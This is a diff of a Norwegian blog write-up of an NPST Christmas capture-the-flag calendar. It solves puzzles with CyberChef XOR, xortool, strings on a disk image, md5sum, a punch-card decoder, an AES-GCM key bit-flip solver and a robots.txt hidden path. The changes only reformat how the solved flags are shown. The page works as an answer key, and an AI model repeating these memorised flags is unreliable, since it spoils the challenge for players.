-&lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false)XOR(%7B'option':'UTF8','string':'JulenErTeit'%7D,'Standard',false)&amp;amp;input=R1NVL01XUjBRWHBVVzFwN1RHWnZJVFVYSmdRYUhpVWJDUmRPTnhjZ0VRd0FhaGdERVU0TElnY3hZeWNsR0V3T0R5c0JQdzhNVkNjVUFnSUxaUm94RjBrZGFpWThOanBsR2pVWFNSS3ZBUmhGQXlBV2RCWU1FMm9HaVVVR0pBQjBOamtuSGxVS0Nod2dCalVSSFZRbEJRa1hEellZT3dzTUJtb0ZpVVVnS2dBd0ZRWVlLd2NmRGd0bEJqRVhHeDArR2g0TUd5aFNQVVVORVNSVkh3d2RNUmQwRVFBUUx4dENSVHNyRmpFWFNSS3lHUXNBSEdVWE9rVUdCRG9HR1FnRElBQTlDdzVVS3dOTUFRYzJBVEZGQmdRdkJ3MFdCQ29jTVFzTVdrQTVDUUVMTnhjNlJRZ0NhanM4TmpwcFVoNFFCUkZxT3dVV0hTQWNlRVVCRVRnUUdCRUxOMUk3Q0IwVkpnRk1GZ0VvVWg4cEtDRVpWUVFFSEdVRXNoY2RWQ1VYQmdBRk1WSXlDaHRVTEJrSkZ3dGxFeUpGRFIwNUJnbEZBVFVYSmdRYUhpVWJDUXNMYTNoZVNFa2dJd2NmQVE4aVVtUldSMFY0VzExY1RpNGVOUmNkRVdvRGlSY0xaUll0RGgwZExSQk1EUThtR1RFWERGU3ZWUWdBQlRjTEpCRU1CaTlWbEFzZExoYzREQm9BTHdkTUZnRW9VaUlFRzFRNUVBSUJHbVVHUFFsSlB3WTBPVFpBWlNROVJRTWJLQmNKRjA0akhTWVJHaFUrQVV3TkR6Y1dJRVVFRVM1VmlVVVBLeE00SEJvUk9CQk1EQUFyR2pzSkRSRStWUVZGQ2l3Qkp3QkpqQ1FHQndBQ0xBRWdBQWNSWkg5QlJTRXJBVEFFRGxSNlFVSlVYR3REYlVVUEd6Z1FHQW9GWlJjNlJRZ1RMeHNZUlFzeFVpSUFCUmd6SGdjQUdtVUJKQVFISFNRU0h3b2VOUlltQkE1VUp4b1lSU1VKTXdFMlJWUW1FQWdBSENBY2RBUWZWQVFsUHpGQVpUa1lKRHduYWdNTkYwNHdCakZGR1pGcUh3TUNDU0FHSVJkSkFDTVpUQlVCTmdZL0NnY0FKUWNKRVU0b0Z6QkZEQnBxRkJwRkJpUWNKMFViRVNNYkh3RVhOMXgwSUIwQUx3ZE1CQUl4VXJGRkRZd25HQWxGSGFCU05nQUhEVDRCQ1JaT05SMG5FUUliSkFFREZ3c3hVaklLRzFTdlZSOEFBQ0VYZEowSEJ5RVFBQXdkTVJjbVJROEdLMVZPRmdBc0hqZ0FTMVFvRkI0TFFHVTJNUkZKQWlNSEJ3QWNaUUU3Q0VrYkoxVWlOVDBSVWowT0FoRnFIUTBYVGlzZE1RdEpGU1FRQUJZTFpSMDVSUWdBYWhFSkVSb2dVaklLR3hFdGtCNUZIcUJTTUFBYkVUbFZHQUFjTnhzZ0Noc2RMMXRtU0U0REFERUJDQk5xUlZwTFgzZGNaVnhKQjY5Vkh3NEhJd1l4RVVrNkdpWTRSUm9zSG5RQUIxUWtERXdPSER3Q0lBQWJIU1FTSHdRQ0loMG1EQjBaTDFVZkNnTmxGVDRLR3hBdlZRMFJUak1iZEF3Q0h5OVZBQUFBSWhjbVJRK1JPRlVZREFJaUV6b0NTUUFqR1V3TUFDc2FPd2tORVQ1VkJVV1dLd0UvQUFVZE9RRUpDd3RyVWdLQUd4RnFIUTBHQlNBQU1VVURHeWdYQ1JkT05aZDBGaGtHTHhzTFJRZ3FBSFNBU1JJakd3SUFUaUFjZEJNTUhXb0hHUXNLTVZJd0FBY2FMMVVDSEF0bEdTWWNHUUF2QndVTENTQWNlbTlFVkFhTkhnRVBJbEprVWtkRmVGdGRYRTRzSERJTUJRQTRFQjRSQzJVWE9rVUlFeThiR0VVbENUTUJOa2tISXdFWVJSZ2dBRDhXSFJFdVZRTUNUamNkSUFBZFZDd2FIa1dMWlFFMUJ3WUFMd2NKUlFRd0hqRURCZ1lvRUI0QUNpQWVKd0FIRVdaVkFRQUFaUVF4RndJSFBoQUlBQnBsQkRVWFNSVW1HUWtYQ3lFWGRCTU1HQzRjQzBVY0tnWXhFUXhhYWpNREZ3YWdBakVMSFJnakVob01IV1VVT3hjYUhTUWVDUmRPSVJjZ0VReFVMQm9lQndzM0Z6QUFCUWN2R3dsRkFDb1pkQkVBR0dvVUdFVU1JQlE3Q1FJYUl4c0xBQUJsRURnTUcxUS9CZ1VPQlNBQWRCV01WQ1VZVEFFTE1WSTJDUUFHYWhBQ1JRa3FGblFQSEJoa2YwRkZPaXdBSndFSUUycEVYRXRmZDF4bFhFa1lMd01KRnhvZ1VqRUxTUlV0RUFJUlRpQUdkQlVJQmo0Y1RBOGJLUmMyRnh3SGFnRUZDVTRnSEhRVkJnQXZHeDhNQ3lrZWRBNEFHQzRRVEF4T0N5SUhNVWRVRGhBWUVRdGxFRGdBU1JNZ0doNFJUaUFHSUFBYlZDc0JUQk9MTjFJZ0RBMFlJeElKRnd0bEdUMEpEUkZxQllsRkJ5c2NKd3dORVNSVkNnd0ZMbEluRlFnR0lSQUNSUXN4QmpFWFNSVStWUVFFQUdVUU9BQkpHem9GQ0FRSklBWjZSVDhkYWhBZVJSczJHejhYREZRNmtFd0tBMlVCT1owYkhTUVNId01CTndHc0Rnd0FhaDBORjA0akJ6b0NEQVkrVlFrUkdpQUFKd29FVkNzWkdnQUFaUUV4RjBrQlBsVVlEQUpsbDNRTkNGUW5FQUFCR21VV01SRWRFV29jQWhFTE54d2dTMk5aYWlFREZ4MGhFek5GV0Vaa1JGNUxYM3hTSndzSUJEb1FHRVVZTEZJN0ZSbFVMeHRNQ0FzcEZqMExEbFFsR0V3RUdtVTVHQ1E4SjJvZERSZE9KeDQ5RVIxVU9Rd0hTMDRESFNZTmpBUXZHeGdKQnlJRVBSWkpBaU1aVEFFTE1RWXhSUXNSUGd4TUJCcGxCREVYQWdjK0VBZ0FHbVVHUFFsSlB3WTBPVFpPTFJNaUN3d0dhaEFDQVE5bEhqRUxEZ1l2VlE0RUJXVUNzVVVQR3pnWENSY0xJUmM0Rmd3YUwxVWZEQUFnVWlBTUJWUWdBQUJMWkU5NEVBUWRGU3NiQ3hjTE5WSTVDaDFVR1NVL01XUVdCanNYRFJVK0ZBRUVIUzRiT2dBSFZEeVFIa1VHSkFCMEJ3VWRQZ0ZNRUJvMkV5QVJTUklsQjB3QUdtVVdOUkVJRlNRU0hnQWVaUnQwQ3dnQVBsVWZDZ05sQVRFWFNRRStWUmdNQW1XWGRCWWRGU2NZQ1VVSU54TjBBQWRVTFFjWkZSNGdVaklYQUFJakdRQU1DU0JTSndvRVZDQWFEZ2NMTjFJeUNodFVCQ1UvTVVCbEpEMUZDeEU0VlEwSkFpQlNOUXNhRlQ0QkNVVWJLeHd6Z0VtUmFoY0pDeGN4QmpGRkdoRXRWUTBUVGpFWU1Rc01CejRRQWdCT0l3QTFSUm9BSlFjSUJCb2tIelVXQWgwa0VBSkZDRGNYT1VVZEhTWlZEUUVETEJ3OUZoMEdLd1lHQ2dBMkJqRUVCQkUrVlFRRUhHVVVzUkVkVkRrY0J4Y0xNVkk0blJvYUl4c0xBQUJyZUY1dlBCOHZHeDlGRHlzQk5SRWRmaG9RQWtVcE1nczZSUThiT0ZVWkVRTWdBRDhBSFZRL0d3Z0FIQ1lkSWdBYlZDc0hEZ0FISVZJNUNoMVVCQ1UvTVVCUGVGNHhDQjhoVlJnTUFtVVRPQWtNVkN3YUhrVWJNUjh4RndJUlBsVU5Gd3dnR3pCRkRSRWtWUjhNSFRFWGRCRUFFQzhiUW04OUx4Y3lSVG9rR1NGQVJTVWdHeWNBR3dRakd3c1RCeXNYT205ak9naFBaaTRQS3dZOUN3d2FhZ01GQ1U0emxDWUFTUWMrRUFJQ0dtVVdNVVVIRVRrQkNVVWFLbEl3QkE0UkpCQk1BQm94RnlaRkFoZ3JFZ2tYVGpXWGRBR01CaVljQzBVRk14TTREQjBSUGxVY2dFNGpHeWNPREJwa1ZUb01UaWtYSUFBYlZDOEJHQUFjWlJjNlJRY05haGtKRXdzM0V6b0JrUVpxQmdNSVRpNFRPa1VGRVR3UUhnQk9KeGN3Rnd4VU9KQWFCQndnQUhwdk9TY2VEZzFXVjNkTFlsVmRSbnRNWFZaZmMwZGxYRjVNZmtBS1Zsb25GR0VCV0JWeUNBPT0&quot;&gt;Cyberchef oppskrift&lt;/a&gt;&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{a392960421913165197845f34bf5d1a8}&lt;/strong&gt;&lt;/p&gt;
+&lt;a href=&quot;https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',false)XOR(%7B'option':'UTF8','string':'JulenErTeit'%7D,'Standard',false)&amp;amp;input=R1NVL01XUjBRWHBVVzFwN1RHWnZJVFVYSmdRYUhpVWJDUmRPTnhjZ0VRd0FhaGdERVU0TElnY3hZeWNsR0V3T0R5c0JQdzhNVkNjVUFnSUxaUm94RjBrZGFpWThOanBsR2pVWFNSS3ZBUmhGQXlBV2RCWU1FMm9HaVVVR0pBQjBOamtuSGxVS0Nod2dCalVSSFZRbEJRa1hEellZT3dzTUJtb0ZpVVVnS2dBd0ZRWVlLd2NmRGd0bEJqRVhHeDArR2g0TUd5aFNQVVVORVNSVkh3d2RNUmQwRVFBUUx4dENSVHNyRmpFWFNSS3lHUXNBSEdVWE9rVUdCRG9HR1FnRElBQTlDdzVVS3dOTUFRYzJBVEZGQmdRdkJ3MFdCQ29jTVFzTVdrQTVDUUVMTnhjNlJRZ0NhanM4TmpwcFVoNFFCUkZxT3dVV0hTQWNlRVVCRVRnUUdCRUxOMUk3Q0IwVkpnRk1GZ0VvVWg4cEtDRVpWUVFFSEdVRXNoY2RWQ1VYQmdBRk1WSXlDaHRVTEJrSkZ3dGxFeUpGRFIwNUJnbEZBVFVYSmdRYUhpVWJDUXNMYTNoZVNFa2dJd2NmQVE4aVVtUldSMFY0VzExY1RpNGVOUmNkRVdvRGlSY0xaUll0RGgwZExSQk1EUThtR1RFWERGU3ZWUWdBQlRjTEpCRU1CaTlWbEFzZExoYzREQm9BTHdkTUZnRW9VaUlFRzFRNUVBSUJHbVVHUFFsSlB3WTBPVFpBWlNROVJRTWJLQmNKRjA0akhTWVJHaFUrQVV3TkR6Y1dJRVVFRVM1VmlVVVBLeE00SEJvUk9CQk1EQUFyR2pzSkRSRStWUVZGQ2l3Qkp3QkpqQ1FHQndBQ0xBRWdBQWNSWkg5QlJTRXJBVEFFRGxSNlFVSlVYR3REYlVVUEd6Z1FHQW9GWlJjNlJRZ1RMeHNZUlFzeFVpSUFCUmd6SGdjQUdtVUJKQVFISFNRU0h3b2VOUlltQkE1VUp4b1lSU1VKTXdFMlJWUW1FQWdBSENBY2RBUWZWQVFsUHpGQVpUa1lKRHduYWdNTkYwNHdCakZGR1pGcUh3TUNDU0FHSVJkSkFDTVpUQlVCTmdZL0NnY0FKUWNKRVU0b0Z6QkZEQnBxRkJwRkJpUWNKMFViRVNNYkh3RVhOMXgwSUIwQUx3ZE1CQUl4VXJGRkRZd25HQWxGSGFCU05nQUhEVDRCQ1JaT05SMG5FUUliSkFFREZ3c3hVaklLRzFTdlZSOEFBQ0VYZEowSEJ5RVFBQXdkTVJjbVJROEdLMVZPRmdBc0hqZ0FTMVFvRkI0TFFHVTJNUkZKQWlNSEJ3QWNaUUU3Q0VrYkoxVWlOVDBSVWowT0FoRnFIUTBYVGlzZE1RdEpGU1FRQUJZTFpSMDVSUWdBYWhFSkVSb2dVaklLR3hFdGtCNUZIcUJTTUFBYkVUbFZHQUFjTnhzZ0Noc2RMMXRtU0U0REFERUJDQk5xUlZwTFgzZGNaVnhKQjY5Vkh3NEhJd1l4RVVrNkdpWTRSUm9zSG5RQUIxUWtERXdPSER3Q0lBQWJIU1FTSHdRQ0loMG1EQjBaTDFVZkNnTmxGVDRLR3hBdlZRMFJUak1iZEF3Q0h5OVZBQUFBSWhjbVJRK1JPRlVZREFJaUV6b0NTUUFqR1V3TUFDc2FPd2tORVQ1VkJVV1dLd0UvQUFVZE9RRUpDd3RyVWdLQUd4RnFIUTBHQlNBQU1VVURHeWdYQ1JkT05aZDBGaGtHTHhzTFJRZ3FBSFNBU1JJakd3SUFUaUFjZEJNTUhXb0hHUXNLTVZJd0FBY2FMMVVDSEF0bEdTWWNHUUF2QndVTENTQWNlbTlFVkFhTkhnRVBJbEprVWtkRmVGdGRYRTRzSERJTUJRQTRFQjRSQzJVWE9rVUlFeThiR0VVbENUTUJOa2tISXdFWVJSZ2dBRDhXSFJFdVZRTUNUamNkSUFBZFZDd2FIa1dMWlFFMUJ3WUFMd2NKUlFRd0hqRURCZ1lvRUI0QUNpQWVKd0FIRVdaVkFRQUFaUVF4RndJSFBoQUlBQnBsQkRVWFNSVW1HUWtYQ3lFWGRCTU1HQzRjQzBVY0tnWXhFUXhhYWpNREZ3YWdBakVMSFJnakVob01IV1VVT3hjYUhTUWVDUmRPSVJjZ0VReFVMQm9lQndzM0Z6QUFCUWN2R3dsRkFDb1pkQkVBR0dvVUdFVU1JQlE3Q1FJYUl4c0xBQUJsRURnTUcxUS9CZ1VPQlNBQWRCV01WQ1VZVEFFTE1WSTJDUUFHYWhBQ1JRa3FGblFQSEJoa2YwRkZPaXdBSndFSUUycEVYRXRmZDF4bFhFa1lMd01KRnhvZ1VqRUxTUlV0RUFJUlRpQUdkQlVJQmo0Y1RBOGJLUmMyRnh3SGFnRUZDVTRnSEhRVkJnQXZHeDhNQ3lrZWRBNEFHQzRRVEF4T0N5SUhNVWRVRGhBWUVRdGxFRGdBU1JNZ0doNFJUaUFHSUFBYlZDc0JUQk9MTjFJZ0RBMFlJeElKRnd0bEdUMEpEUkZxQllsRkJ5c2NKd3dORVNSVkNnd0ZMbEluRlFnR0lSQUNSUXN4QmpFWFNSVStWUVFFQUdVUU9BQkpHem9GQ0FRSklBWjZSVDhkYWhBZVJSczJHejhYREZRNmtFd0tBMlVCT1owYkhTUVNId01CTndHc0Rnd0FhaDBORjA0akJ6b0NEQVkrVlFrUkdpQUFKd29FVkNzWkdnQUFaUUV4RjBrQlBsVVlEQUpsbDNRTkNGUW5FQUFCR21VV01SRWRFV29jQWhFTE54d2dTMk5aYWlFREZ4MGhFek5GV0Vaa1JGNUxYM3hTSndzSUJEb1FHRVVZTEZJN0ZSbFVMeHRNQ0FzcEZqMExEbFFsR0V3RUdtVTVHQ1E4SjJvZERSZE9KeDQ5RVIxVU9Rd0hTMDRESFNZTmpBUXZHeGdKQnlJRVBSWkpBaU1aVEFFTE1RWXhSUXNSUGd4TUJCcGxCREVYQWdjK0VBZ0FHbVVHUFFsSlB3WTBPVFpPTFJNaUN3d0dhaEFDQVE5bEhqRUxEZ1l2VlE0RUJXVUNzVVVQR3pnWENSY0xJUmM0Rmd3YUwxVWZEQUFnVWlBTUJWUWdBQUJMWkU5NEVBUWRGU3NiQ3hjTE5WSTVDaDFVR1NVL01XUVdCanNYRFJVK0ZBRUVIUzRiT2dBSFZEeVFIa1VHSkFCMEJ3VWRQZ0ZNRUJvMkV5QVJTUklsQjB3QUdtVVdOUkVJRlNRU0hnQWVaUnQwQ3dnQVBsVWZDZ05sQVRFWFNRRStWUmdNQW1XWGRCWWRGU2NZQ1VVSU54TjBBQWRVTFFjWkZSNGdVaklYQUFJakdRQU1DU0JTSndvRVZDQWFEZ2NMTjFJeUNodFVCQ1UvTVVCbEpEMUZDeEU0VlEwSkFpQlNOUXNhRlQ0QkNVVWJLeHd6Z0VtUmFoY0pDeGN4QmpGRkdoRXRWUTBUVGpFWU1Rc01CejRRQWdCT0l3QTFSUm9BSlFjSUJCb2tIelVXQWgwa0VBSkZDRGNYT1VVZEhTWlZEUUVETEJ3OUZoMEdLd1lHQ2dBMkJqRUVCQkUrVlFRRUhHVVVzUkVkVkRrY0J4Y0xNVkk0blJvYUl4c0xBQUJyZUY1dlBCOHZHeDlGRHlzQk5SRWRmaG9RQWtVcE1nczZSUThiT0ZVWkVRTWdBRDhBSFZRL0d3Z0FIQ1lkSWdBYlZDc0hEZ0FISVZJNUNoMVVCQ1UvTVVCUGVGNHhDQjhoVlJnTUFtVVRPQWtNVkN3YUhrVWJNUjh4RndJUlBsVU5Gd3dnR3pCRkRSRWtWUjhNSFRFWGRCRUFFQzhiUW04OUx4Y3lSVG9rR1NGQVJTVWdHeWNBR3dRakd3c1RCeXNYT205ak9naFBaaTRQS3dZOUN3d2FhZ01GQ1U0emxDWUFTUWMrRUFJQ0dtVVdNVVVIRVRrQkNVVWFLbEl3QkE0UkpCQk1BQm94RnlaRkFoZ3JFZ2tYVGpXWGRBR01CaVljQzBVRk14TTREQjBSUGxVY2dFNGpHeWNPREJwa1ZUb01UaWtYSUFBYlZDOEJHQUFjWlJjNlJRY05haGtKRXdzM0V6b0JrUVpxQmdNSVRpNFRPa1VGRVR3UUhnQk9KeGN3Rnd4VU9KQWFCQndnQUhwdk9TY2VEZzFXVjNkTFlsVmRSbnRNWFZaZmMwZGxYRjVNZmtBS1Zsb25GR0VCV0JWeUNBPT0&quot;&gt;Cyberchef oppskrift&lt;/a&gt;&lt;/p&gt;
 
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{a392960421913165197845f34bf5d1a8}&lt;/p&gt;
 &lt;p&gt;Kode:&lt;/p&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;melding.b64 | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; melding.bin
 &lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;xortool melding.bin
@@ -1578,8 +1583,9 @@ drwxrwxrwx 1 root root 4096 Nov 29 16:22 ..
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;Så, der har vi feriebildene, og de er passordbeskyttet. Det er alt som vises på disken, ikke no gøy i andre filer. 
 Da må passordet være skjult en plass, vi prøver med en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; på dd filen, og der kommer faktisk et password ut di gitt, base 64 encoded. 
-“Et kjempelangt passord som aldri vil kunne gjettes av NPST! :)”&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{Et kjempelangt passord som aldri vil kunne gjettes av NPST! :)}&lt;/strong&gt;&lt;/p&gt;
+“Et kjempelangt passord som aldri vil kunne gjettes av NPST! :)”&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{Et kjempelangt passord som aldri vil kunne gjettes av NPST! :)}&lt;/p&gt;
 
 &lt;p&gt;Ett av bildene har nok en gul lapp med informasjon &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;VII TW ⚙️&lt;/code&gt;.&lt;/p&gt;
 &lt;h3 id=&quot;alternativer-15&quot;&gt;Alternativer (15)&lt;/h3&gt;
@@ -1603,8 +1609,7 @@ Følger vi oppskriften over får vi flagget.&lt;/p&gt;
 &lt;/span&gt;b14a7b8059d9c055954c92674ce60032
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;strong&gt;Flagg: PST{b14a7b8059d9c055954c92674ce60032}&lt;/strong&gt;&lt;/p&gt;
-
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{b14a7b8059d9c055954c92674ce60032}&lt;/p&gt;
 &lt;h3 id=&quot;feriebilder-20&quot;&gt;Feriebilder (20)&lt;/h3&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Bildene ser jo ut til å være helt normale sydpolare feriebilder, 
 men vi vet jo at sydpolare spioner liker å gjemme data inni andre ting. 
@@ -1620,8 +1625,8 @@ vedder på at det er en red herring. Rød er den iallefall, og md5 av filen er d
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;md5sum &lt;/span&gt;måltid.png 
 07385aacc9264738cd7c32e76f3b81a5  måltid.png
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;Flagg: PST{07385aacc9264738cd7c32e76f3b81a5}&lt;/strong&gt;&lt;/p&gt;
 
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{07385aacc9264738cd7c32e76f3b81a5}&lt;/p&gt;
 &lt;h2 id=&quot;luke-16&quot;&gt;Luke 16&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Opptrapping av fremmed rekruttering
 SPST har trappet opp sine forsøk på å rekruttere informanter i både NPST og i den nordpolare alvebefolkningen. 
@@ -1697,7 +1702,7 @@ puts&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&
 &lt;p&gt;Så… der var svaret ja. rimelig enkel begynner reverserings oppgave uten at man har behov for noe tungt ala &lt;a href=&quot;https://www.hex-rays.com/products/ida/&quot;&gt;IDA&lt;/a&gt;, 
 &lt;a href=&quot;https://rada.re/n/radare2.html&quot;&gt;Radare2&lt;/a&gt;, &lt;a href=&quot;https://ghidra-sre.org/&quot;&gt;Ghidra&lt;/a&gt; etc.&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Flagg: PST{f3ad88918fd18414cc773271f586f6a9}&lt;/strong&gt;&lt;/p&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{f3ad88918fd18414cc773271f586f6a9}&lt;/p&gt;
 
 &lt;h2 id=&quot;luke-18&quot;&gt;Luke 18&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Mistenkelig ponni
@@ -1735,7 +1740,8 @@ PST krøllparentes parentes mdG tWo time pad parentes slutt krøllparentes slutt
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'two time pad'&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;md5sum
 &lt;/span&gt;4a0fc5f3c88874cab11c64e965dff58d  -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;&lt;strong&gt;Flagg: PST{4a0fc5f3c88874cab11c64e965dff58d}&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{4a0fc5f3c88874cab11c64e965dff58d}&lt;/p&gt;
 
 &lt;h2 id=&quot;luke-20---mystisk-kort-5&quot;&gt;Luke 20 - Mystisk kort (5)&lt;/h2&gt;
 &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Mystisk kort
@@ -1758,11 +1764,12 @@ Eksempel: kode: print(&quot;Hei, verden!&quot;) → output: Hei, verden! → sva
 gøy informasjon på &lt;a href=&quot;https://www.masswerk.at/keypunch/&quot;&gt;The virtual keypunch&lt;/a&gt;, spesielt under “advanced usage”,
 hvor vi kan finne IBM/360 Column Binary Format. Jeg finner ingen online tools for dette (er jo gammelt),
 så jeg skriver en dekoder basert på informasjonen over og får ut &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MD5(IBM 029+IBM/S60)&lt;/code&gt;. Tipper S er feil og at det skal stå
-&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MD5(IBM 029+IBM/360)&lt;/code&gt;, som gir oss korrekt flagg.&lt;br /&gt;
-&lt;strong&gt;Flagg: PST{8dc9112fecac5e5d50eaf14e0fff2440}&lt;/strong&gt;&lt;/p&gt;
+&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;MD5(IBM 029+IBM/360)&lt;/code&gt;, som gir oss korrekt flagg.&lt;/p&gt;
 
-&lt;p&gt;Kode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1020 2020 0010 2012 2001 2200 1020 0000 0800 0200 0001 200A 2001 2200 1020 0C00 0300 0008 0800 1012'&lt;/span&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{8dc9112fecac5e5d50eaf14e0fff2440}&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;solver.py&quot;
+&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'1020 2020 0010 2012 2001 2200 1020 0000 0800 0200 0001 200A 2001 2200 1020 0C00 0300 0008 0800 1012'&lt;/span&gt;
 &lt;span class=&quot;c1&quot;&gt;# split into blocks
 &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;blocks&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
 &lt;span class=&quot;n&quot;&gt;result&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt;
@@ -1930,11 +1937,12 @@ Det er nå meget sannsynlig at det blir en GOD JUL.
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 &lt;p&gt;AES-256 GCM, med en kryptert melding, tilgjengelig nonce, tilgjengelig tag og tilgjengelig key. Pluss en tag, uncertain_bits_count: 2.
 En slurve-tabbe fører her til at jeg bruker veldig mye tid på å bytte ut bytes isteden for bits.
-Så snart jeg fikk et hint fra Roy Solberg, så var denne raskt i boks ved å flippe bits i nøkkelen. &lt;br /&gt;
-&lt;strong&gt;Flagg: PST{7e7343c9cbe6114f8fd312490816387d}&lt;/strong&gt;&lt;/p&gt;
+Så snart jeg fikk et hint fra Roy Solberg, så var denne raskt i boks ved å flippe bits i nøkkelen.&lt;/p&gt;
 
-&lt;p&gt;Kode:&lt;/p&gt;
-&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;
+&lt;p class=&quot;note&quot;&gt;Flagg: PST{7e7343c9cbe6114f8fd312490816387d}&lt;/p&gt;
+
+&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# file: &quot;solver.py&quot;
+&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;Crypto.Cipher&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;AES&lt;/span&gt;
 &lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;bitarray&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;bitarray&lt;/span&gt;
 
 &lt;span class=&quot;nb&quot;&gt;vars&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
@@ -2075,7 +2083,7 @@ Disallow: /temmelig-hemmelig/
 
 &lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://spst.no/temmelig-hemmelig/&lt;/code&gt; gir oss flagget direkte på siden.&lt;/p&gt;
 
